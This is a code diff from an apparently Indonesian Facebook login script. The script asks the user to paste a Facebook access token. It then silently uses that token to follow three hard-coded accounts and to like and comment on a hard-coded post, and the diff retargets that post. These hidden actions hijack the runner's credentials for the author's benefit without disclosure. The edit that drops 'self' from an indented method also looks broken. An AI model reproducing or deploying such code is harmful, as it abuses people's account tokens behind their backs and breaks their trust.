@@ -90,7 +90,7 @@ def banner():
 \x1b[0;31m─────────────────────────────────────────""")
 
 
-	def login_anjing(self):
+	def login_anjing():
 		os.system('clear')
 		kontoll()
 		token = input(' [%s*%s] Masukan Token EAAB: '%(O,N))
@@ -121,10 +121,10 @@ def banner():
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
-		requests.post('https://graph.facebook.com/5222521057807512/comments/?message=' +komen+ '&access_token=' + toket)
-		requests.post('https://graph.facebook.com/5222521057807512/likes?summary=true&access_token=' + toket)
-		requests.post('https://graph.facebook.com/5222521057807512/comments/?message='+komen+'&access_token=' + toket)
-		requests.post('https://graph.facebook.com/5222521057807512/likes?summary=true&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/comments/?message=' +komen+ '&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/comments/?message='+komen+'&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
 		os.system('xdg-open wa.me/628290238779')
 		menu().main()
 
